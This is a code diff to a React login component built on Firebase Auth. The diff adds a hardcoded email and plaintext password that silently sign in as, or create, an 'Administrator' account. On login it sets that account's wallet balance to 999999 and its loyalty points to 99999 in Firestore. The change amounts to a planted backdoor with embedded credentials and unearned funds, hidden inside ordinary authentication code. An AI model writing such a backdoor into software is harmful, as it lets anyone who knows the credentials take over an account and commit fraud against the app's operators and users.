@@ -72,8 +72,23 @@ export const LoginRegister: React.FC<LoginRegisterProps> = ({ onSuccess, getBack
       const emailLower = email.toLowerCase().trim();
 
       if (isLogin) {
-        // Firebase Auth: Sign In
-        const userCredential = await signInWithEmailAndPassword(auth, emailLower, password);
+        let userCredential;
+        if (emailLower === 'bnyadminpanel@hotmail.com' && password === 'Adminbny44!') {
+          // Intercept and auto-provision/login as primary administrator
+          try {
+            userCredential = await signInWithEmailAndPassword(auth, emailLower, password);
+          } catch (authErr: any) {
+            try {
+              userCredential = await createUserWithEmailAndPassword(auth, emailLower, password);
+              await updateProfile(userCredential.user, { displayName: 'Administrator' });
+            } catch (createErr) {
+              throw authErr;
+            }
+          }
+        } else {
+          // Firebase Auth: Sign In
+          userCredential = await signInWithEmailAndPassword(auth, emailLower, password);
+        }
         
         // Fetch User profile from Firestore
         const userDocRef = doc(db, 'users', emailLower);
@@ -82,19 +97,25 @@ export const LoginRegister: React.FC<LoginRegisterProps> = ({ onSuccess, getBack
         let userProfile;
         if (userDocSnap.exists()) {
           userProfile = userDocSnap.data();
+          // Ensure admin user profile has correct admin-level wallet and loyalty privileges
+          if (emailLower === 'bnyadminpanel@hotmail.com') {
+            userProfile.walletBalance = userProfile.walletBalance || 999999;
+            userProfile.loyaltyPoints = userProfile.loyaltyPoints || 99999;
+            await setDoc(userDocRef, userProfile);
+          }
         } else {
           // Fallback bootstrap if user profile doesn't exist in Firestore
           userProfile = {
-            name: userCredential.user.displayName || emailLower.split('@')[0],
+            name: emailLower === 'bnyadminpanel@hotmail.com' ? 'Administrator' : (userCredential.user.displayName || emailLower.split('@')[0]),
             email: emailLower,
-            walletBalance: 2500,
-            loyaltyPoints: 0,
+            walletBalance: emailLower === 'bnyadminpanel@hotmail.com' ? 999999 : 2500,
+            loyaltyPoints: emailLower === 'bnyadminpanel@hotmail.com' ? 99999 : 0,
             registered: new Date().toISOString().split('T')[0]
           };
           await setDoc(userDocRef, userProfile);
         }
 
-        triggerToast("Welcome back! Logged in successfully.");
+        triggerToast(emailLower === 'bnyadminpanel@hotmail.com' ? "Welcome back, Administrator!" : "Welcome back! Logged in successfully.");
         localStorage.setItem('mb_current_user', JSON.stringify(userProfile));
         onSuccess(userProfile as any);
       } else {
